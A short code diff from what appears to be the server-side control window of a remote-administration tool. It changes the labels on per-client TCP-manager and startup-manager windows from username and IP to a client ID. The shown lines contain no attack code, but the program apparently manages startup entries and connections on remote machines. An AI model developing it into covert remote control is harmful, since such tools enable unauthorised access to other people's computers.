@@ -643,7 +643,7 @@ public partial class ServerWindow : Window
         if (clients.Count == 0 || _server == null) return;
         foreach (var c in clients)
             OpenFeatureWindow<TcpManagerWindow>(c.Id, () =>
-                new TcpManagerWindow(_server, c.Id, $"{c.Username}@{c.IP}"));
+                new TcpManagerWindow(_server, c.Id, c.Id));
     }
 
     private void StartupManager_Click(object sender, RoutedEventArgs e)
@@ -652,7 +652,7 @@ public partial class ServerWindow : Window
         if (clients.Count == 0 || _server == null) return;
         foreach (var c in clients)
             OpenFeatureWindow<StartupManagerWindow>(c.Id, () =>
-                new StartupManagerWindow(_server, c.Id, $"{c.Username}@{c.IP}"));
+                new StartupManagerWindow(_server, c.Id, c.Id));
     }
 
     private void FileManager_Click(object sender, RoutedEventArgs e)
